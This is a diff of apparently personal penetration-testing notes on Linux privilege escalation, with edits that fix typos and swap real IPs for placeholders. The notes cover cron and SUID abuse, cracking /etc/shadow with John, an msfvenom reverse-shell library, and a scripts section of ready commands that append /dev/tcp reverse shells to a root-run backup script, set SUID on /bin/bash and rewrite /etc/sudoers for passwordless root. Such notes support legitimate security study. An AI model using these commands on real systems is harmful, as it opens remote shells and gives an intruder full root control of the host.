@@ -18,7 +18,6 @@ if the job run as high privilege user we get high privilege shell
 
 ```
 cat /etc/crontab
-c
 ls -lah /etc/cron*
 crontab -l
 grep "CRON" /var/log/syslog
@@ -26,6 +25,7 @@ grep "CRON" /var/log/syslog
 
 - search for con job that run a file as root
 - search for writeable Cron Job dependency files
+- run pspy
 
 #### Services
 list writable services
@@ -63,9 +63,7 @@ crack that hashes it the following files:
 - /etc/passwd
 - /etc/shadow
 
-you ca use John with unshadow commands
-
-
+you can use John with unshadow commands
 #### inspect services footprint
 
 maybe there is footprint of service that revels the credentials
@@ -128,7 +126,7 @@ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-gro
 
 #### Abusing  SUID/GUID Binaries and Capabilities
 
-if script of command hash seuid permmisiond we can run it and it will execute as high privilege context
+if script of command hash SUID permissions we can run it and it will execute as high privilege context
 
 tools:
 ```
@@ -149,7 +147,7 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 GTFOBins https://gtfobins.github.io/
 
-commond:
+common command:
 - wget
 - find
 - cp
@@ -212,7 +210,7 @@ msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=<IP> LPORT=<
 - looking for vulnerabilities in the system
 - exploit services that running on the machine localhost
 - binary file versions
-- run ./suggester.sh  to see fit exploit
+- run `suggester.sh`  to see fit exploit
 
 tools:
 - metasploit
@@ -240,14 +238,12 @@ vulnerabilities for example:
 	- kernel version: 4.4.0-116-generic
 - RDS protocol https://www.exploit-db.com/exploits/15285
 
-
-
 #### scripts
 
 ```
-echo "/usr/bin/bash -l > /dev/tcp/192.168.45.207/22 0<&1 2>&1" >> /var/backups/etc_Backup.sh 
+echo "/usr/bin/bash -l > /dev/tcp/<IP>/<PORT> 0<&1 2>&1" >> /var/backups/etc_Backup.sh 
 
-echo "bash -i >& /dev/tcp/<local-ip>/4444 0>&1" >> /var/backups/etc_Backup.sh 
+echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> /var/backups/etc_Backup.sh 
 
 echo "chmod u+s /bin/bash" >> /var/backups/etc_Backup.sh 
 
@@ -255,8 +251,7 @@ echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers
 
 /bin/bash -i
 
-/bin/sh -i >& /dev/tcp/192.168.45.188/80 0>&1
+/bin/sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
 
-
-### chmod +x !!!
+don't forget add `cmode +x`
